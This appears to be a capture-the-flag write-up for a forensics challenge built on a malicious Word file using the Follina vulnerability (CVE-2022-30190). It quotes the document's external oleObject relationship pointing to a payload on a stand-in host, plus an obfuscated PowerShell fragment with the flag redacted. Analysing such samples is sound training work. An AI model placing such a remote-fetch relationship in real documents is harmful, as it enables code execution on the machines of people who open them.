## Skills involved: basic research and reversing

A nice little forensics challenge with no forensic tools required.

<details>
  <summary>Hint 1: </summary>
  
  It's advisable not to run programs or open pdfs/docs without checking whether it contains virus or not, especially if it's a forensics challenge.
</details>

<details>
  <summary><b>Solution: </b></summary>
  <br/>
  
  The file uses [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/cve-2022-30190), which is explained extensively by [John Hammond](https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug).
  The file can also be changed to .zip format and decompressed (all docs are zips). Some guessing will be needed if the solver didn't scan the file, e.g. searching the domain `diagnostic.htb`. Eventually we land on `document.xml.rels`:
  
```xml
<Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://diagnostic.htb:32208/223_index_style_fancy.html!" TargetMode="External"/>
```
  
  After downloading the file, the flag can be decoded with base64 decryption and understanding some Powershell command.
  
```ps
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{**','**','**','**','**','**','HT','**')
```
(*flag redacted*)
</details>
